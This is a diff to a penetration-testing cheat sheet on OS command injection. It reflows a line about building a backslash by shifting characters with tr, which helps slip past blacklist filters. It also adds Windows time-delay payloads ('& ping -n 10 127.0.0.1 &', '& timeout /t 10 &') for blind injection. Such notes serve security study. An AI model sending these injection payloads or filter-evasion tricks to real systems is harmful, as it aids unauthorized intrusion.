@@ -51,7 +51,8 @@
     * To produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\student`), and then specify a starting position (`~6` -> `\student`)
     * eg: `echo`` `**`%HOMEPATH:~6,-11%`** , `$env:HOMEPATH[0]` , `$env:PROGRAMFILES[10]`&#x20;
   * #### Character Shifting <sup><sub>(<sub></sup><sup><sub>`echo`<sub></sup> <sup><sub> </sup><sup><sub>not required)<sub></sup>
-    * `man ascii` <sup><sub>(\ is on 92, before it is \[ on 91)<sub></sup>      &#x20;-> `echo`` `**`$(tr '!-}' '"-~'<<<[)`**&#x20;
+    * `man ascii` <sup><sub>(\ is on 92, before it is \[ on 91)<sub></sup>
+      &#x20;-> `echo`` `**`$(tr '!-}' '"-~'<<<[)`**&#x20;
 
 ### Bypassing Blacklisted Commands <a href="#bypassing-blacklisted-commands" id="bypassing-blacklisted-commands"></a>
 
@@ -97,7 +98,9 @@
 
 ### Blind OS Command Injection with Time Delays
 
-* `& ping -c 10 127.0.0.1 &` (try using different separators)
+* `& ping -c 10 127.0.0.1 &` (try using different separators) <sup><sub>(Linux)<sub></sup>
+* `& ping -n 10 127.0.0.1 &` <sup><sub>(Windows - uses `-n` instead of `-c`)<sub></sup>
+* `& timeout /t 10 &` <sup><sub>(Windows alternative - direct sleep, no ICMP needed)<sub></sup>
 * Triggers a time delay to send 10 ICMP packets
 
 ### Blind OS Command Injection with Output Redirection
